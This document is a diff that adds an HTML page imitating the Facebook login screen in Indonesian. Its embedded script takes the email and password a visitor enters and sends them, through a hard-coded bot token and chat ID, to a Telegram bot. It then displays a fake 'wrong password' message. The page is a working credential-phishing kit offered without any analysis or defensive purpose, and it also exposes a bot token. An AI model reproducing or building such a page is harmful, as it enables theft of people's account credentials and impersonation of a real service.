@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk Facebook</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="favicon.png" type="image/x-icon">
+</head>
+<body>
+    <div class="login-container">
+        <img src="images/fb.svg" alt="Facebook Logo" class="logo">
+        <h2>Login ke Facebook</h2>
+        <form id="loginForm" action="#" method="post">
+            <div class="input-group">
+                <input type="text" id="email" name="email" placeholder="Email atau Nomor Telepon" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Kata Sandi" required>
+                <!-- Elemen untuk menampilkan pesan status di bawah sebelah kiri input password -->
+                <div id="statusMessage" class="status-message"></div>
+            </div>
+            <button type="submit">Masuk</button>
+            <div class="forgot-password">
+                <a href="#">Lupa akun?</a>
+            </div>
+        </form>
+        <div class="signup">
+            <p>atau</p>
+            <a href="#">Buat akun baru</a>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Mencegah form dari pengiriman default
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Mengirim data ke bot Telegram
+            var message = 'Email: ' + email + '\nPassword: ' + password;
+            fetch('https://api.telegram.org/bot7288381272:AAHPk2osdNN1T-yZc04RC8TOoSDTLni-Qug/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '5728184383',
+                    text: message
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                displayMessage('password yang anda masukkan salah', 'success');
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                displayMessage('Terjadi kesalahan. Silakan coba lagi.', 'error');
+            });
+        });
+
+        function displayMessage(message, type) {
+            var statusMessageDiv = document.getElementById('statusMessage');
+            statusMessageDiv.textContent = message;
+            statusMessageDiv.style.display = 'block'; // Tampilkan pesan
+            statusMessageDiv.className = 'status-message error'; // Warna merah untuk pesan berhasil
+        }
+    </script>
+</body>
+</html>
